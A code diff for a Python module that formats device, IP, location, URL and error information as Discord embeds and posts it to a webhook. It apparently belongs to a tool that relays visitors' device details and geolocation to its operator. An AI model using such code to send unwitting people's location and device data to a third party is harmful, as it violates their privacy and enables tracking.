@@ -4,7 +4,7 @@ import requests
 from json import dumps, loads
 
 
-def sender(url, msg_type, content):
+def discord_sender(url, msg_type, content):
     json_str = dumps(content)
     json_content = loads(json_str)
     if msg_type == 'device_info':
@@ -55,8 +55,9 @@ def sender(url, msg_type, content):
                 }
             ]
         }
-        requests.post(url, json=info_message)
-    elif msg_type == 'ip_info':
+        requests.post(url, json=info_message, timeout=10)
+
+    if msg_type == 'ip_info':
         ip_info_msg = {
             "content": None,
             "embeds": [
@@ -92,8 +93,9 @@ def sender(url, msg_type, content):
                 }
             ]
         }
-        requests.post(url, json=ip_info_msg)
-    elif msg_type == 'location':
+        requests.post(url, json=ip_info_msg, timeout=10)
+
+    if msg_type == 'location':
         location_msg = {
             "content": None,
             "embeds": [
@@ -129,4 +131,30 @@ def sender(url, msg_type, content):
                 }
             ]
         }
-        requests.post(url, json=location_msg)
+        requests.post(url, json=location_msg, timeout=10)
+
+    if msg_type == 'url':
+        url_msg = {
+            "content": json_content['url'],
+            "embeds": None,
+            "attachments": []
+        }
+        requests.post(url, json=url_msg, timeout=10)
+
+    if msg_type == 'error':
+        error_msg = {
+            "content": None,
+            "embeds": [
+                {
+                    "color": 16711680,
+                    "fields": [
+                        {
+                            "name": "Error",
+                            "value": json_content['error']
+                        }
+                    ]
+                }
+            ],
+            "attachments": []
+        }
+        requests.post(url, json=error_msg, timeout=10)
